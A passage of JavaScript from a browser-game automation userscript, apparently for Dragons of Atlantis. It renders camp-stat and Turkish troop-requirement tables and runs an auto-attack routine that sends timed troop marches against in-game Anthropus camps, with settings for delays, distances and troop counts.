    m += '<BR><DIV class=pbSubtitle>'+translate( 'Stats by Camp Level' )+'</div><DIV style="overflow-x:auto"><TABLE class=pbTabPad><TR class=pbTabHdr1 align=center><TD style="background:none !important;"></td><TD align=right colspan=10>'+ titleLine( translate( 'CAMP LEVELS' ) ) +'</td></tr><TR align=right class=pbTabHdr1><TD style="background:none !important;"></td>';
    for (i=1; i<11; i++)
      m += '<TD width=45>'+ i +'</td>';
    m += '</tr><TR><TD colspan=11><HR class=thin></td></tr><TR align=right><TD class=pbTabLeft># '+translate( 'Attacks' )+':</td>';
    for (i=1; i<11; i++)
      m += '<TD>'+ Data.options.campStats.byLevel[i].numAttacks +'</td>';
    m += '</tr><TR><TD colspan=11><HR class=thin></td></tr>'; 
      
    var items =  flipStats ('items');     
    for (var p in items){
      m += '<TR align=right><TD class=pbTabLeft>'+ translate( Names.itemAbbr(p) ) +':</td>';
      for (i=1; i<11; i++)
        m += '<TD>'+ items[p][i] +'</td>';
    }
    m += '</tr></table></div>';
    div.innerHTML = m;
    
    function flipStats (name){
      var o = {};
      for (var i=1; i<11; i++){
        for (var p in Data.options.campStats.byLevel[i][name]){
          if (!o[p]){
            o[p] = [];
            for (var x=1; x<11; x++)
              o[p][x] = 0;
          }
          o[p][i] += Data.options.campStats.byLevel[i][name][p];
        }
      }
      return o;
    }
  },
  
  /***TABELLE ANTHROPUS 1-5***/
  
    helpPopA : function (){ // TODO: Translate
		var stTitle = 'background-color: #2BB524; font-weight:bold;text-align:center; color:#ffffff;';
        var stTitle2 = 'background-color: #2BB524; font-weight:bold;';
		var stTitle3 = 'background-color: #2BB524; font-weight:bold;text-align:center; color:#ffffff;';
        var s0 = 'http://img62.imageshack.us/img62/1582/16857792.gif';
        var s1 = 'http://img683.imageshack.us/img683/8149/31096760.gif';
        var s2 = 'http://img706.imageshack.us/img706/1485/40621535.gif';
        var s3 = 'http://img148.imageshack.us/img148/9913/21372285.gif';
        var s4 = 'http://img90.imageshack.us/img90/1061/24344413.gif';
        var s5 = 'http://img691.imageshack.us/img691/3886/85305366.gif';

		var m = '';
		m += '<TABLE width=100%><TR><TD colspan=4 align=center style="' + stTitle + '">Bu Tablo EasyMaster Tarafından KoC Wiki Sitesinden Alınan Bilgilerce Hazırlanmıştır..<BR></td></tr>';
  	  	m += '<TABLE width=100% bgcolor=#ffffff><TR><TD colspan=4 align=center style="' + stTitle2 + '"><A target="_tab" href="http://www.facebook.com/DoaPowerTools">Daha Fazlası İçin Buraya Tıkla</a></td></tr>';
		m += '<TABLE width=100% bgcolor=#ffffd0><TR><TD colspan=4 align=center style="' + stTitle3 + '"><A target="_tab" href="http://www.facebook.com/DoaPowerTools">Sorunların İçin Buraya Tıkla ve Mesaj At..</a></td></tr>';
  	m += '<TR><TD> </td><TD></td><TD></td></tr>';
	
  	m += '<TR><TD><b><center>Level</center></b></td><TD><center>Asker</center></td><TD><center>General</center></td><TD><center>Araştırma Levelleri</center></td></tr>';
		m += '<TR><TD> </td><TD></td><TD></td></tr>';	
	
		m += '<TR><TD><center>1</center></td><TD>50 Hamal + 50 Minotaur + 100 Okçu</td><TD><center><img src="'+ s5 +'"></center></td><TD><center>Yok</center></TD></tr>';
		m += '<TR><TD><center>1</center></td><TD>14 Tritones</td><TD><center><img src="'+ s4 +'"></center></td><TD><center>Yok</center></TD></tr>';
		m += '<TR><TD><center>1</center></td><TD>120 ÇAD</td><TD><center><img src="'+ s4 +'"></center></td><TD><center>1Metalüriji,3Dragon Bilimi</center></TD></tr>';
		m += '<TR><TD><center>1</center></td><TD>600 Hamal + 33 Okçu</td><TD><center><img src="'+ s5 +'"></center></td><TD><center>?</center></TD></tr>';
		m += '<TR><TD><center>1</center></td><TD>33 Okçu + 33 Zeplin</td><TD><center><img src="'+ s5 +'"></center></td><TD><center>?</center></TD></tr>';
		m += '<TR><TD><center>1</center></td><TD>300 Okçu + 200 Hamal + 200 Minotaur + 200 Baltacı</td><TD><center><img src="'+ s5 +'"></center></td><TD><center>1Metalüriji,2 Kalibrasyon o 8Metalüriji</center></TD></tr>';
		m += '<TR><TD><center>1</center></td><TD>500 Dev + 25 Zeplin</td><TD><center><img src="'+ s5 +'"></center></td><TD><center>8Metalüriji</center></TD></tr>';
                m += '<TR><TD><center>1</center></td><TD>1500 SD</td><TD><center><img src="'+ s5 +'"></center></td><TD><center>7Metalüriji, 6Tıp, 6 Kalibrasyon, 8DR, 8Dragon Bilimi</center></TD></tr>';
                m += '<TR><TD>&nbsp;</td><TD></td><TD></TD></tr>';
		
		m += '<TR><TD><center>2</center></td><TD>350 Okçu + 47 Zeplin</td><TD><center><img src="'+ s5 +'"></center></TD><TD><center>3Metalüriji, 3Tıp, 3 Kalibrasyon</center></TD></tr>';
		m += '<TR><TD><center>2</center></td><TD>300 Okçu + 700 Minotaur + 200 Acemi Er + 1050 Hamal</td><TD><center><img src="'+ s5 +'"></center></TD><TD><center>3Metalüriji, 3Tıp, 3 Kalibrasyon</center></TD></tr>';
		m += '<TR><TD><center>2</center></td><TD>100 Baltacı + 500 Minotaur + 850 Okçu + 20 Zeplin</td><TD><center><img src="'+ s5 +'"></center></TD><TD><center>3Metalüriji, 3Tıp, 3 Kalibrasyon</center></TD></tr>';
		m += '<TR><TD>&nbsp;</td><TD></td><TD></TD></tr>';
		
		m += '<TR><TD><center>3</center></td><TD>2700 Zeplin</td><TD><center><img src="'+ s5 +'"></center></TD><TD><center>4Metalüriji, 4Tıp, 4Dragon Bilimi</center></TD></tr>';
		m += '<TR><TD><center>3</center></td><TD>500 Okçu + 71 Zeplin</td><TD><center><img src="'+ s5 +'"></center></TD><TD><center>4Metalüriji, 5Tıp, 4 Kalibrasyon</center></TD></tr>';
		m += '<TR><TD>&nbsp;</td><TD></td><TD></TD></tr>';

		m += '<TR><TD><center>4</center></td><TD>1600 Okçu + 950 Minotaur + 87 Zeplin</td><TD><center><img src="'+ s5 +'"></center></TD><TD><center>4Metalüriji, 4Tıp, 4 Kalibrasyon</center></TD></tr>';
		m += '<TR><TD><center>4</center></td><TD>1500 Okçu + 100 Zeplin</td><TD><center><img src="'+ s5 +'"></center></TD><TD><center>4Metalüriji, 4Tıp, 4 Kalibrasyon</center></TD></tr>';
		m += '<TR><TD><center>4</center></td><TD>3500 SD + 1700 SD</td><TD><center><img src="'+ s5 +'"></center></TD><TD><center>6Metalüriji, 6Tıp, 6 Kalibrasyon</center></TD></tr>';
		m += '<TR><TD>&nbsp;</td><TD></td><TD></TD></tr>';

		m += '<TR><TD><center>5</center></td><TD>5000 Okçu + 100 Zeplin</td><TD><center><img src="'+ s5 +'"></center></TD><TD><center>4Metalüriji, 4Tıp, 5 Kalibrasyon</center></TD></tr>';
		m += '<TR><TD><center>5</center></td><TD>7600 SD</td><TD><center><img src="'+ s5 +'"></center></TD><TD><center>7Metalüriji, 7Tıp, 7Dragon Bilimi</center></TD></tr>';
		m += '<TR><TD><center>5</center></td><TD>5000 SD + 2000 ÇAD</td><TD><center><img src="'+ s5 +'"></center></TD><TD><center>7Metalüriji, 7Tıp, 7Dragon Bilimi</center></TD></tr>';
		m += '<TR><TD><center>5</center></td><TD>4000 SD + 4000 ÇAD</td><TD><center><img src="'+ s5 +'"></center></TD><TD><center>7Metalüriji, 7Tıp, 7Dragon Bilimi</center></TD></tr>';
		m += '<TR><TD>&nbsp;</td><TD></td><TD></TD></tr>';


		
  var pop = new CPopuppa ('giftHelp', 0, 0, 650, 900, true);
  pop.centerMe (mainPop.getMainDiv());
  pop.getMainDiv().innerHTML = m;
  pop.getTopDiv().innerHTML = '<CENTER><FONT COLOR=#FFFFFF><B>TGE ANTROPUS 1-5</b></center>';
  pop.show (true);
  },



  /***TABELLE ANTHROPUS 6-10***/
  
    helpPopA2 : function (){ // TODO: Translate
		var stTitle = 'background-color: #2BB524; font-weight:bold;text-align:center; color:#ffffff;';
        var stTitle2 = 'background-color: #2BB524; font-weight:bold;';
		var stTitle3 = 'background-color: #2BB524; font-weight:bold;text-align:center; color:#ffffff;';
        var s0 = 'http://img62.imageshack.us/img62/1582/16857792.gif';
        var s1 = 'http://img683.imageshack.us/img683/8149/31096760.gif';
        var s2 = 'http://img706.imageshack.us/img706/1485/40621535.gif';
        var s3 = 'http://img148.imageshack.us/img148/9913/21372285.gif';
        var s4 = 'http://img90.imageshack.us/img90/1061/24344413.gif';
        var s5 = 'http://img691.imageshack.us/img691/3886/85305366.gif';

		var m = '';
		m += '<TABLE width=100%><TR><TD colspan=4 align=center style="' + stTitle + '">Bu Tablo EasyMaster Tarafından KoC Wiki Sitesinden Alınan Bilgilerce Hazırlanmıştır..<BR></td></tr>';
  	  	m += '<TABLE width=100% bgcolor=#ffffff><TR><TD colspan=4 align=center style="' + stTitle2 + '"><A target="_tab" href="http://www.facebook.com/DoaPowerTools">Daha Fazlası İçin Buraya Tıkla</a></td></tr>';
		m += '<TABLE width=100% bgcolor=#ffffd0><TR><TD colspan=4 align=center style="' + stTitle3 + '"><A target="_tab" href="http://www.facebook.com/DoaPowerTools">Sorunların İçin Buraya Tıkla ve Mesaj At..</a></td></tr>';
	
  	m += '<TR><TD><b><center>Level</center></b></td><TD><center>Asker</center></td><TD><center>General</center></td><TD><center>Araştırma Levelleri</center></td></tr>';
		m += '<TR><TD> </td><TD></td><TD></td></tr>';	
	
		m += '<TR><TD><center>6</center></td><TD>6000 Okçu + 108 Zeplin</td><TD><center><img src="'+ s5 +'"></center></TD><TD><center>7Metalüriji, 7Tıp, 7Kalibrasyon</center></TD></tr>';
		m += '<TR><TD><center>6</center></td><TD>10000 SD</td><TD><center><img src="'+ s5 +'"></center></TD><TD><center>7Metalüriji, 7Tıp, 7Dragon Bilimi</center></TD></tr>';
		m += '<TR><TD><center>6</center></td><TD>20000 ÇAD</td><TD><center><img src="'+ s5 +'"></center></TD><TD><center>7Metalüriji, 7Tıp, 7Dragon Bilimi</center></TD></tr>';
		m += '<TR><TD>&nbsp;</td><TD></td><TD></TD></tr>';
		
		m += '<TR><TD><center>7</center></td><TD>5000 Okçu + 2000 Tritones</td><TD><center><img src="'+ s5 +'"></center></TD><TD><center>9Metalüriji, 9Tıp, 8Kalibrasyon</center></TD></tr>';
		m += '<TR><TD><center>7</center></td><TD>15000 SD o 30000 ÇAD</td><TD><center><img src="'+ s5 +'"></center></TD><TD><center>8Metalüriji, 8Tıp, 8Dragon Bilimi</center></TD></tr>';
		m += '<TR><TD><center>7</center></td><TD>20000 Okçu + 400 Zeplin</td><TD><center><img src="'+ s5 +'"></center></TD><TD><center>10Metalüriji, 8Tıp, 9Kalibrasyon</center></TD></tr>';
		m += '<TR><TD><center>7</center></td><TD>600 Tritones + 200 Zeplin + 3000 Okçu</td><TD><center><img src="'+ s5 +'"></center></TD><TD><center>10Metalüriji, 9Tıp, 10Kalibrasyon</center></TD></tr>';
		m += '<TR><TD><center>7</center></td><TD>10000 SD + 6000 Tritones</td><TD><center><img src="'+ s5 +'"></center></TD><TD><center>8Metalüriji, 8Tıp, 8Dragon Bilimi</center></TD></tr>';
                m += '<TR><TD>&nbsp;</td><TD></td><TD></TD></tr>';
		
		m += '<TR><TD><center>8</center></td><TD>30000 Okçu + 250 Zeplin</td><TD><center><img src="'+ s5 +'"></center></TD><TD><center>9Metalüriji, 9Tıp, 9Kalibrasyon</center></TD></tr>';		
		m += '<TR><TD><center>8</center></td><TD>29000 SD</td><TD><center><img src="'+ s5 +'"></center></TD><TD><center>8Metalüriji, 8Tıp, 8Dragon Bilimi</center></TD></tr>';
		m += '<TR><TD><center>8</center></td><TD>55000 ÇAD</td><TD><center><img src="'+ s5 +'"></center></TD><TD><center>8Metalüriji, 8Tıp, 8Dragon Bilimi</center></TD></tr>';
		m += '<TR><TD>&nbsp;</td><TD></td><TD></TD></tr>';
		
		m += '<TR><TD><center>9</center></td><TD>55000 SD</td><TD><center><img src="'+ s5 +'"></center></TD><TD><center>9Metalüriji, 9Tıp, 9Dragon Bilimi</center></TD></tr>';
                m += '<TR><TD>&nbsp;</td><TD></td><TD></TD></tr>';

		m += '<TR><TD><center>10</center></td><TD>100000 SD</td><TD><center><img src="'+ s5 +'"></center></TD><TD><center>9Metalüriji, 10Tıp, 10Dragon Bilimi</center></TD></tr>';
		m += '<TR><TD><center>10</center></td><TD>15000 Ateş aynası + 250 Zeplin</td><TD><center><img src="'+ s5 +'"></center></TD><TD><center>10Metalüriji, 10Tıp, 10AC</center></TD></tr>';
		m += '<TR><TD><center>10</center></td><TD>30000 Tritones + 1000 Okçu</td><TD><center><img src="'+ s5 +'"></center></td><TD><center>10Metalüriji, 10Tıp, 10AC</center></TD></tr>';
		m += '<TR><TD>&nbsp;</td><TD></td><TD></TD></tr>';

		
  var pop = new CPopuppa ('giftHelp', 0, 0, 650, 900, true);
  pop.centerMe (mainPop.getMainDiv());
  pop.getMainDiv().innerHTML = m;
  pop.getTopDiv().innerHTML = '<CENTER><FONT COLOR=#FFFFFF><B>TGE ANTROPUS 6-10</b></center>';
  pop.show (true);
  },


  /*** STATS Sub-tab ****/
  tabStats : function (){
    var t = Tabs.AutoAttack;
    var m = '<DIV class=pbTitle>'+translate( 'Auto-attack Stats' )+'</div>\
      <CENTER><INPUT id=pmcampRS type=submit value='+translate( 'Clear Stats' )+' \></center>\
      <DIV class=pbStatBox id=pbcampSO></div>';
    document.getElementById('pbatmContent').innerHTML = m;
    document.getElementById('pmcampRS').addEventListener('click', function(){t.clearStats(); t.showStats();}, false);
    t.showStats();  
  },

  // byLevel.resources
  clearStats : function (){
    var t = Tabs.AutoAttack;
    var now = serverTime();
    Data.options.campStats = {tsStart:now, runTime:0, numAttacks:0, items:{}, resources:{}, byLevel:[]};
    t.curRunStart = now;
    for (var i=0; i<12; i++)
      Data.options.campStats.byLevel[i] = {numAttacks:0, items:{}, resources:{}};
  },
  
  checkMapData : function (){
    var t = Tabs.AutoAttack;
    if (t.checkMapBusy)
      return false;
    if (Data.targets.radius!=35 || Data.targets.center.x!=Seed.s.cities[0].x || Data.targets.center.y!=Seed.s.cities[0].y){
      t.checkMapBusy = true;
      t.setAttackEnable (false);
      t.scanMap(35, function(){logit('****** Setting checkMapBusy to FALSE'); Tabs.AutoAttack.checkMapBusy = false});
      return false;
    }    
    return true;
 },
  
  gotBattleReport : function (rpt){
    var t = Tabs.AutoAttack;
//logit ('Tabs.AutoAttack.gotBattleReport');    
    if (rpt.report.location.terrain != 'AnthropusCamp')
      return;

    // tie report to march id ...
    var mid=null;
    for (var p in Data.options.campMarches ){
      var march = Data.options.campMarches[p];
      if (march.x==rpt.report.location.x && march.y==rpt.report.location.y
      && march.general.id == rpt.report.attacker.general.id
      ){  // TODO: time and troops check here
        mid = p;
        break;
      }
    }
    if (mid)
      t.trackStats (mid, rpt);
      
    if (!Data.options.campAttack.deleteCampAttacks && !Data.options.campAttack.stopAttackOnLoss )
      return;
//logit (inspect (rpt, 8, 1));
    if (Data.options.campAttack.stopAttackOnLoss){
      for (var p in rpt.report.attacker.units){
        if (rpt.report.attacker.units[p][0] != rpt.report.attacker.units[p][1]){
          var ts = new Date(rpt.report_notification.created_at * 1000).myString();
          t.abort ( translate( 'Troops lost!' )+' ('+ ts +')');
          return;
        }
      }
    }
    if (Data.options.campAttack.deleteCampAttacks && rpt.report.attacker.name == Seed.s.name)
      Messages.deleteMessage (rpt.report_notification.id);
  },
  
  
  setAttackEnable : function (onOff){
    var t = Tabs.AutoAttack;
    clearTimeout (t.attackTimer);
    var but = document.getElementById('pbatEnable');
    Data.options.campAttack.enabled = onOff;
    if (onOff){
      but.value = translate('Oto Açik');
      but.className = 'butAttackOn';
      t.curRunStart = serverTime();
      t.autoCheckTargets();
    } else {
      if (t.curRunStart != 0)
        Data.options.campStats.runTime += (serverTime()-t.curRunStart);
      but.value = translate('Oto Kapali');
      but.className = 'butAttackOff';
      t.dispFeedback ('');
    }
  },

  abort : function (msg){
    var t = Tabs.AutoAttack;
    t.setAttackEnable (false);
    t.dispFeedback (msg);
    actionLog (msg);
  },
  
  marchTick : function (){
    var t = Tabs.AutoAttack;
    clearTimeout (t.marchTimer);
    document.getElementById('pbatMarches').innerHTML = marchTable('camp');
    t.marchTimer = setTimeout (t.marchTick, 2000);
  },
  
  dispFeedback : function (msg){
    if (msg && msg!='')
      msg = new Date().toTimeString().substring (0,8) +' '+ msg;
    document.getElementById('pbatFeedback').innerHTML = msg;
  },

  // Data.options.campAttack {enabled:false, maxDist:7, repeatTime:60, delayMin:15, delayMax:25, levelEnable:[]}
  autoCheckTargets : function (){
    var t = Tabs.AutoAttack;
    var now = serverTime();
    var cityIdx = 0;
    clearTimeout (t.attackTimer);
    
    // back off for 1 second and retry if Ajax.march busy (general,troops,etc may about to be used)
if (!Data.options.campAttack.enabled)
  return;
if (Ajax.marchBusy > 0){
logit ('autoCheckTargets: marchBusy *********************************************************************');
  t.attackTimer = setTimeout (t.autoCheckTargets, 1000);
  return;
}
    
    if (!t.checkMapData())
      return;
//logit ('autoCheckTargets');
    if (now-t.lastAttack < t.delayMin){
logit ('************** autoCheckTargets Shouldn\'t happen *************');    
      t.attackTimer = setTimeout (t.autoCheckTargets, (Data.options.campAttack.delayMin-now+t.lastAttack)*1000);
      return;
    }

    var marchCount = 0;
    for (var p in Seed.marches)
      if (Seed.marches[p].ownerId == 'camp')
        ++marchCount;
    if (marchCount >= Data.options.campAttack.maxMarches){
      t.dispFeedback ( translate( 'User-set maximum marches reached.') );
      t.attackTimer = setTimeout (t.autoCheckTargets, 5000);
      return;
    }
    
    if (getMusterPointSlots (cityIdx) <= 0){
      t.dispFeedback ( translate( 'Muster Point Full') );
      t.attackTimer = setTimeout (t.autoCheckTargets, 5000);
      return;
    }
    if ((gen = getAvailableGeneral ()) == null){
      t.dispFeedback ('Nessun Generale disponibile'); // TODO: Translate
      t.attackTimer = setTimeout (t.autoCheckTargets, 5000);
      return;
    }
    // check all potential targets ...
    var camps = t.getActiveCampList();
    var target = null;
    var rptTime = now - ( (Data.options.campAttack.repeatTime * 60) + 1);
    for (var i=0; i<camps.length; i++){
      var camp = camps[i];
      // check repeat time
      if (camp.last!=null && camp.last>rptTime)
        continue;
      // check troops
      if (t.checkTroops (cityIdx, camp.lvl) == null){
        // ok, send march ...
        t.sendAttack (cityIdx, camp, gen, function (rslt){
          var t = Tabs.AutoAttack;
          if (rslt){
            var delay = Data.options.campAttack.delayMin + parseInt((Math.random()*(Data.options.campAttack.delayMax-Data.options.campAttack.delayMin)));
            t.attackTimer = setTimeout (t.autoCheckTargets, delay*1000);
          }
        });
        return;
      } 
    }
    t.dispFeedback ( translate( 'No targets/troops available') );
    t.attackTimer = setTimeout (t.autoCheckTargets, 10000);
  },
  
  // notifies with true for success, false if error
  sendAttack : function (cityIdx, camp, gen, notify){
    var t = Tabs.AutoAttack;
    var now = serverTime();
    if (t.attackBusy==undefined)
      t.attackBusy=false;
    if (t.attackBusy){
      t.dispFeedback ('ERRORE! (Attacco non riuscito,c\'e\' risposta dal server?)'); // TODO: Translate
      return;
    }
    t.attackBusy = true;
    t.dispFeedback ( translate( 'Attacking level' )+' '+ camp.lvl +' '+translate( 'camp at' )+' '+ camp.x +','+ camp.y);
    t.lastAttack = now;
    new Ajax.march (Seed.s.cities[cityIdx].id, camp.x, camp.y, gen.id, Data.options.campAttack.troops[camp.lvl], 'camp', function (rslt){
        t.attackBusy = false;
        if (rslt.ok && rslt.dat.result.success){
t.addMarch (rslt.dat.result.job);        
          t.attackErrors = 0;
          camp.last = now;
          if (Data.options.campAttack.logAttacks)
            actionLog ('Inviato attacco a livello '+ camp.lvl +' di Coord '+ camp.x +','+ camp.y); // TODO: Translate
          if (notify)
            notify (true);
        } else {
          t.dispFeedback ('Errore: '+ rslt.errmsg); // TODO: Translate
          actionLog ('Errore Attacco: '+ rslt.errmsg); // TODO: Translate
          if (t.attackErrors++ > 100000){
            t.setAttackEnable (false);
            if (notify)
              notify (false);
          } else {
            notify (true);
          }
        }
    });
 },
  
  // returns null if ok, else error message
  checkTroops : function (cityIdx, campLevel){
    var troops = Data.options.campAttack.troops[campLevel];
    var totTroops = 0;
    for (var p in troops){
      if (troops[p] > 0){
        totTroops += troops[p];
        if (Seed.s.cities[cityIdx].units[p] < troops[p]){
          return ( translate( 'Not enough' ) +' '+ translate(p));
        }
      }
    }
    if (totTroops <= 0){
      return translate( 'No Troops Defined' );
    }
    return null;
  },
  
  // return array of camps that satisfy config (max distance, level enables)
  getActiveCampList : function (){
    var t = Tabs.AutoAttack;
    var ret = [];
    for (var i=0; i<Data.targets.camps.length; i++){
      var camp = Data.targets.camps[i];
      if ((camp.dist<=Data.options.campAttack.levelDist[camp.lvl]) && Data.options.campAttack.levelEnable[camp.lvl])
        ret.push (camp);
    }
    return ret;
  },
  
  checkAttack : function (camp, notify){
    var t = Tabs.AutoAttack;
    var cityId = Seed.s.cities[0].id;
    var cityIdx = 0;
    var gen;
    // check troops
    var troops = Data.options.campAttack.troops[camp.lvl];
    var totTroops = 0;
    for (var p in troops){
      if (troops[p] > 0){
        totTroops += troops[p];
        if (Seed.s.cities[cityIdx].units[p] < troops[p]){
          notify ( translate( 'Not enough' ) +' '+ p);
          return;
        }
      }
    }
    if (totTroops <= 0){
        notify ('No Troops Defined');
        return;
    }
    // TODO: 'too many troops for muster point level'
    if (getMusterPointSlots (cityIdx) <= 0){
      notify ( translate( 'Muster Point Full') );
      return;
    }
    if ((gen = getAvailableGeneral ()) == null){
      notify ('Nessun generale disponibile'); // TODO: Translate
      return;
    }
    new Ajax.march (cityId, camp.x, camp.y, gen.id, troops, 'camp', function (rslt){
//logit ('march result:\n' + inspect (rslt, 4, 1));    
      if (rslt.ok && rslt.dat.result.success){
t.addMarch (rslt.dat.result.job);        
        camp.last = serverTime();
        actionLog ('Inviato attacco a livello '+ camp.lvl +' di Coord '+ camp.x +','+ camp.y); // TODO: Translate
        notify (null);
      } else {
        notify ('Errore: '+ rslt.errmsg );
      }
    });
  },

  
  
 // Data.options.campAttack {enabled:false, maxDist:7, repeatTime:60, delayMin:15, delayMax:25, levelEnable:[], levelDist:[]}
  
  /** CONFIG LEVELS SUB-TAB ***/
  troopTypes : ['Porter', 'Conscript', 'Spy', 'Halberdsman', 'Minotaur', 'Longbowman', 'SwiftStrikeDragon', 'BattleDragon', 'ArmoredTransport', 'Giant', 'FireMirror', 'AquaTroop', 'StoneTroop', 'FireTroop',  'WaterDragon', 'StoneDragon','FireDragon'],
  tabConfigLevels : function (){
    var t = Tabs.AutoAttack;
    var m = '<DIV class=pbTitle>'+translate( 'Oto Kamp Levelleri' )+'</div>\
        <DIV style="overflow-x:auto">\
        <TABLE class=pbTabPad><TR class=pbTabHdr1><TD style="background:#FCDC26 !important;"></td><TD align=center colspan=10>'+ titleLine( translate( 'KAMP LEVELLERI' ) ) +'</td></tr>\
        <TR align=center class=pbTabHdr1><TD style="background:#FCDC26 !important;"></td><TD>1</td><TD>2</td><TD>3</td><TD>4</td><TD>5</td><TD>6</td><TD>7</td><TD>8</td><TD>9</td><TD>10</td></tr>\
        </div><TR align=center><TD class=pbTabLeft>'+translate( 'Izinli' )+':</td>';
    for (var x=1; x<=10; x++)
      m += '<TD><INPUT type=checkbox id=pbatEn_'+ x +(Data.options.campAttack.levelEnable[x]?' CHECKED':'')   +' \></td>';
    m += '</tr><TR align=center><TD class=pbTabLeft>'+translate( 'Max Mesafe' )+':</td>';
    for (var x=1; x<=10; x++)
      m += '<TD><INPUT type=text id=pbatDist_'+ x +' maxlength=2 style="width:30px" value="'+ Data.options.campAttack.levelDist[x] +'"\></td>';
    m += '</tr><TR><TD><DIV class=short></td></tr>';
    
    for (i=0; i<t.troopTypes.length; i++){
      m += '<TR><TD class=pbTabLeft>'+ translate( Names.troops.byName[t.troopTypes[i]][2] ) +':</td>';
      for (var x=1; x<=10; x++){
        var num = Data.options.campAttack.troops[x][t.troopTypes[i]];
        if (!num)
          num = 0;
        m += '<TD><INPUT type=text id=pbatTrp_'+ x +'_'+ i +' maxlength=6 size=2 value="'+ num +'"\></td>';
      }
      m += '</tr>';
    }    
    m += '</table><DIV class=short></div></div>';
    document.getElementById('pbatmContent').innerHTML = m;
 
    // add event listeners ...
    for (var x=1; x<=10; x++)
      document.getElementById('pbatEn_'+ x).addEventListener('change', enableChanged, false);
    for (var x=1; x<=10; x++)
      document.getElementById('pbatDist_'+ x).addEventListener('change', distChanged, false);
    for (i=0; i<t.troopTypes.length; i++)
      for (var x=1; x<=10; x++)
        document.getElementById('pbatTrp_'+ x +'_'+ i).addEventListener('change', troopsChanged, false);
    
    function enableChanged (e){
      var args = e.target.id.split('_');
      Data.options.campAttack.levelEnable[args[1]] = e.target.checked;
    }
    function distChanged (e){
      var args = e.target.id.split('_');
      var x = parseIntZero(e.target.value);
      if (isNaN(x) || x<1 || x>t.MAX_DISTANCE){
        e.target.style.backgroundColor = 'red';
        dispError ('La distanza di attacco e\' compresa tra 1 e '+ t.MAX_DISTANCE);
      } else {
        e.target.value = x;
        e.target.style.backgroundColor = '';
        Data.options.campAttack.levelDist[args[1]] = x;
      }
    }
    function troopsChanged (e){
      var args = e.target.id.split('_');
      var x = parseIntZero(e.target.value);
      if (isNaN(x) || x<0 || x>100000){
        e.target.style.backgroundColor = 'red';
        dispError ('Il numero delle truppe non e\' corretto.'); // TODO: Translate
      }else {
        e.target.value = x;
        Data.options.campAttack.troops[args[1]][t.troopTypes[args[2]]] = x;
        e.target.style.backgroundColor = '';
      }
    }
    function dispError (msg){
      var dial = new ModalDialog (t.cont, 300, 150, '', true);
      dial.getContentDiv().innerHTML = msg;
    }
  },

  /** GENERAL CONFIG SUB-TAB ***/
  tabConfigGeneral : function (){
    var t = Tabs.AutoAttack;
    var m = '<DIV class=pbTitle>'+translate( 'Auto-attack Configuration' )+'</div>\
      <DIV style="overflow-x:auto"><TABLE class=pbTabPad>\
      <TR><TD class=pbTabLeft>'+translate( 'Random delay between attacks' )+':</td><TD>\
        <INPUT class=short id=pbaacfgRD1 maxlength=4 type=text value="'+ Data.options.campAttack.delayMin +'"/> '+translate( 'to' )+' \
        <INPUT class=short id=pbaacfgRD2 maxlength=4 type=text value="'+ Data.options.campAttack.delayMax +'"/> '+translate( 'Saniye' )+'</td></tr>\
      <TR><TD class=pbTabLeft>'+translate( 'Ayni Hedefe Tekrar Saldiri Süresi' )+':</td><TD><INPUT class=short id=pbaacfgSTD maxlength=4 type=text value="'+ Data.options.campAttack.repeatTime +'"/> '+translate( 'minutes' )+'</td></tr>\
      <TR><TD class=pbTabLeft>'+translate( 'Saldiri Loglari' )+':</td><TD><INPUT id=pbaacfgLA '+ (Data.options.campAttack.logAttacks?'CHECKED ':'') +' type=checkbox \></td></tr>\
      <TR><TD class=pbTabLeft>'+translate( 'Saldiri Raporlarini Sil' )+':</td><TD><INPUT id=pbaacfgDMR '+ (Data.options.campAttack.deleteCampAttacks?'CHECKED ':'') +' type=checkbox \></td></tr>\
      <TR><TD class=pbTabLeft>'+translate( 'Asker Kaybinda Durdur' )+':</td><TD><INPUT id=pbaacfgSTL '+ (Data.options.campAttack.stopAttackOnLoss?'CHECKED ':'') +' type=checkbox \></td></tr>\
      <TR><TD class=pbTabLeft>'+translate( 'Max. Yollanacak Saldiri' )+':</td><TD><INPUT class=short id=pbaacfgMM maxlength=2 type=text value="'+ Data.options.campAttack.maxMarches +'"\></td></tr>\
      <TR><TD class=pbTabLeft colspan="2"><INPUT id=pbaaRescan type="submit" value="Yeniden Tara" \></td></tr>\
      </table>';
    document.getElementById('pbatmContent').innerHTML = m;
    document.getElementById('pbaacfgDMR').addEventListener('change', function (e){Data.options.campAttack.deleteCampAttacks = e.target.checked;}, false);
    document.getElementById('pbaacfgSTL').addEventListener('change', function (e){Data.options.campAttack.stopAttackOnLoss = e.target.checked;}, false);
    document.getElementById('pbaacfgLA').addEventListener('change', function (e){Data.options.campAttack.logAttacks = e.target.checked;}, false);
    document.getElementById('pbaacfgRD1').addEventListener('change', delayChanged, false);
    document.getElementById('pbaacfgRD2').addEventListener('change', delayChanged, false);
    document.getElementById('pbaacfgSTD').addEventListener('change', delayChanged, false);
    document.getElementById('pbaacfgMM').addEventListener('change', maxMarchesChanged, false);
    document.getElementById('pbaaRescan').addEventListener('click', rescanMap, false);

    function delayChanged (e){
      var min = parseIntNan(document.getElementById('pbaacfgRD1').value);
      var max = parseIntNan(document.getElementById('pbaacfgRD2').value);
      var repeat = parseIntNan(document.getElementById('pbaacfgSTD').value);
      if (min<MIN_CAMP_DELAY || min>3600 || (max-min)<5 || repeat<30){
        var dial = new ModalDialog (t.cont, 300, 150, '', true);
        dial.getContentDiv().innerHTML = '<B>Geçersiz Deger/i</b><BR><BR>Ilk Deger Bunlarin Arasinda Olmalidir '+ MIN_CAMP_DELAY +' e 3600<BR>2. Deger Ilk Degerden En Az 5sn Fazla Olmalidir.<BR>3. Deger En Az 30dk Olabilir.'; // TODO: Translate
        return;
      }
      Data.options.campAttack.delayMin = min;
      Data.options.campAttack.delayMax = max;
      Data.options.campAttack.repeatTime = repeat;
    }
    function maxMarchesChanged (e){
      var val = parseIntNan(document.getElementById('pbaacfgMM').value);
      if (val<0 || val>12){
        e.target.style.backgroundColor = 'red';
        return;
      }
      e.target.style.backgroundColor = '';
      Data.options.campAttack.maxMarches = val;
    }
    
    function rescanMap (e){
      Data.targets.radius = 33;
      t.checkMapData();
    }
  },
    

  /** TARGETS SUB-TAB ***/
  tabTargets : function (){
    var t = Tabs.AutoAttack;
    var timer = null;
